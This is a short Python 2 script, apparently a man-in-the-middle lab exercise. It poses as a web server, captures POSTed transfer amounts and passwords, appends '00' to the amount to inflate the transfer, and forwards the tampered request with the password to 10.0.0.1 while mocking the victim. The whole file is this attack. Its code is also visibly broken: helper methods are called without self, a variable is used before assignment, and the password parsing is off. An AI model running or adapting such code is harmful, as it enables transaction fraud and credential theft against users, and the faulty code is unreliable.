
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import SocketServer
import requests


get_res = "<html><body><h1>Devil Hi!</h1></body></html>"

class S(BaseHTTPRequestHandler):
    password = None
        
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
    def do_GET(self):
        self._set_headers()
        #self.wfile.write("<html><body><h1>Devil Hi!</h1></body></html>")
        self.wfile.write(get_res)

    def do_HEAD(self):
        self._set_headers()
        
    def extract_pass(self,data):
        return data[data.find("password=")+1:]
    
    def extract_money(self,data):
        return data[data.find('=')+1:data.find('&')].replace("%2C",",").replace("%24","$")
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
        post_data = self.rfile.read(content_length) # <--- Gets the data itself
        print("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n",
            str(self.path), str(self.headers), post_data.decode('utf-8'))
        print(post_data)
        self._set_headers()
        
        data = {'transfer':extract_money(post_data) + '00' ,'password':extract_pass(data)}
        r = requests.post('http://10.0.0.1/',data=data)
        
        self.wfile.write(r.text[:-1]+' Hoho Haha Haha HE He :Evile laugh')

def run(server_class=HTTPServer, handler_class=S, port=80):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print 'Starting httpd...'
    httpd.serve_forever()
        
if __name__ == "__main__":
    run()